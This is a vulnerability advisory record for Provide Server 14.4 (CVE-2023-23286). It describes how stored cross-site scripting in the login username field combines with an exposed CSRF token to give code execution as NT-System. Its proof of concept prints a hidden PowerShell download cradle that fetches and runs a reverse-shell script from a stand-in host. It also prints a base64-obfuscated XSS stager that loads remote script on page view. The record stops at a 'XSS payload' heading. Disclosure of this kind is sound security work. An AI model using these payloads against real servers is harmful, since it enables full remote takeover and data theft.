{
    "text": "title : Provide Server 14.4 XSS / Cross Site Request Forgery / Code Execution  ， detail : Provide Server version 14.4 suffers from cross site scripting and cross site request forgery vulnerabilities that can lead to remote code execution.  ， cve : advisories | CVE-2023-23286  ，  ， desc : Provide Server v. 14.4  ， CVE-2023-23286  ， Vulnerabilities :   ， CWE-79 : Improper Neutralization of Input During Web Page Generation  ， Unauthenticated stored XSS in server-log delivered via username field from login-form  ， CWE-352 : Cross-Site Request Forgery  ， CSRF-token exposed in javascript , making it possible to obtain a valid CSRF-Token and use it in XMLHTTPRequests. This vulnerability allows an attacker to add a task that runs commands on the server as \"NT-System\" Impact :   ， An attacker could exploit the unauthenticated stored XSS vulnerability by injecting malicious code into the login form's username field. When the server-log is viewed , the malicious code will be executed , potentially allowing the attacker to steal user data or execute further attacks.  ， By exploiting the CSRF vulnerability , an attacker could add a task to the server that runs commands with NT-System privileges. This could potentially allow the attacker to take complete control of the server , access sensitive data , or disrupt service.  ， Proof Of Consept  ， RCE via XSS and CSRF  ， The attacker places the staged XSS into the username field and sends the login request. This will place the XSS stager in the server log and trigger when a administrator opens the log.  ， The XSS stager downloads and runs the XSS payload. The payload will add a task that runs the powershell downloadcradle every time someone connects to the server. Even unauthenticated connections.  ， The powershell-script downloaded in this example is a reverse shell , connecting back to the attacker. As the task runs as NT System on the server , the attacker will have full controll on the server.  ， Powershell Downloadcradle  ， PowerShell -noprofile -executionpolicy bypass \"Start-process powershell.exe -argumentlist '-window hidden -noexit Start-Job { IEX ( IWR https : /example.com/rev.ps1 -UseBasicParsing ) }'\" ; exit  ， Staged XSS  ， <img id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vZXhhbXBsZS5jb20veHNzLmpzIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw src=https : /example.com/1 onload=eval ( atob ( this.id ) >  ， XSS payload",
    "time": "Apr 6, 2023"
}